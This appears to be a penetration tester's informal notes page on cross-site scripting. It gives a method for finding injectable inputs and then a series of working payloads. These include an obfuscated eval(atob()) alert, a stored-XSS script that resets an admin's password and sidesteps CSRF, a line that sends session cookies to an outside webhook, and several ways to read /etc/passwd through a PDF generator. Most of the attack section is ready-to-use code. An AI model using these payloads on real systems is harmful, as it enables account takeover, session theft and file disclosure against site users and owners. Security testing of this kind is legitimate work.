---
title: XSS
---

## What is this about?
Cross-Site scripting attacks. 
[This](https://en.wikipedia.org/wiki/Cross-site_scripting) is all the info you need to know, and [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) are all the example you'll need.

## Couple basic stuff I usually do
To find a vuln input, these are the steps I follow on every field, this may sometimes include headers like the *User-Agent* ...
* Directly testing characters that might break things like {--!";'/\<>
* Testing unescaped version of those characters through whatever proxy I use
* Spamming XSS lists and checking if something goes wrong then finding which one worked 
* Running tech specific payloads

Now, except if I feel that something might work even though nothing did anything weird, I'll just try another page.

Once the vuln input is found this is what I usually go for depending on time left and breach vectors I have/may have on the engagement.

### The "Fuck it, I just need a screenshot"
```javascript
<script>alert('You done fucked up now!!')</script>
```

### The "Nah a screenshot will do, the PoC is there"
```javascript
<svg/onload=alert("It's a bird!? It's a plane!? No! It's an XSS!!")>
```

### The "I told you not to regex filter by hand last time..."
```javascript
<img onload="eval(atob('YWxlcnQoIkkgdG9sZCB5b3UgbGFzdCB0aW1lIHRvIGZpeCB0aGlzIHNoaXQgdGhlIGNvcnJlY3Qgd2F5Iik='))">
```
You get the point eh?

### I need to exploit this though
Yeah, sometimes you just need to reset the admin's password to connect right? I mean [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) is a thing nowadays...

Got a stored XSS? good! You might need to add extra headers to match whatever is going on through 
```javascript
<script>
    r = new XMLHttpRequest();    
    r.open('POST', 'https://target/that-profile-page-I-need-to-exploit', true);
    r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
    r.send('newpassword=Password1234&repeated-newpassword=Password1234');
</script>
```
You might need to add extra headers with *r.setRequestHeader()* to match whatever is going on, but the skeleton is there.

Oh the Whole CSRF thing? Yeah you're bypassing that if you're running it from the website itself. And if you aren't, you can always do a multistep request, i.e. get the CSRF-token by parsing the returned page from the first request and then run your password change and adding that value in the headers...

You could also send the session cookie to whatever [requestbin](http://requestbin.net/), [postbin](https://postb.in/), [webhook](https://webhook.site), or stuff you [built yourself](https://github.com/Runscope/requestbin). By running a polished version of
```javascript
document.write("<iframe src='https://your-webhook/'"+document.cookie+"></iframe>");
```
Oh noes, security protocols have been bypassed!

### Oh look a pdf that's generated with user input!
Basic LFI by XSS in a PDF generator, used a variant a couple of times, fun times :D

```javascript
<script>
	r = new XMLHttpRequest
	r.onload=function(){
		document.write(this.responseText)
	}
	r.open("GET","file:///etc/passwd")
	r.send()
</script>
```
You could also do
```javascript
<iframe src="file:///etc/passwd"></iframe>
```
Or even some
```javascript
<img src="this-file-doesnt-exist" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
```
